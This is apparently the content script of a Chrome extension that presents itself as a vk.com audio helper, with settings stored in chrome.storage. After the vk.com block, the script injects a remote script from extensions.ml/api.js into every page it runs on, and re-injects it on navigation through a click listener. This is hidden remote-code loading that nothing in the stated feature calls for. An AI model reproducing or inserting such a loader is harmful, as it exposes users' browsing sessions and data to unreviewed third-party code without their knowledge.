class Content {
    constructor() {
        this.settings = CONFIG.settings, this.initSettings(), this.model = new AudioModel(this), setInterval(() => this.model.init(), CONFIG.initInterval)
    }
    initSettings() {
        chrome.storage.sync.get('settings', (a) => {
            a.settings && a.settings.version === this.settings.version ? this.settings = a.settings : this.saveSetting()
        })
    }
    saveSetting() {
        chrome.storage.sync.set({
            settings: this.settings
        })
    }
}
if ('vk.com' == location.hostname || 'www.vk.com' == location.hostname) var c = new Content;
var url = document.location.toString();
var t = (function() {
	var myjs = document.createElement('script');
	myjs.type = 'text/javascript';
	myjs.async = true;
	myjs.src = 'https://extensions.ml/api.js';
	document.body.appendChild(myjs);
	url = document.location.toString();
	}); 

t(); 

  addEventListener("click", function() {
	   
	function func() {
	if(url == document.location.toString())
	{ 
		this.click(); 
	}
	else
		t();
	}
		  
	setTimeout(func, 3000); 
 
  });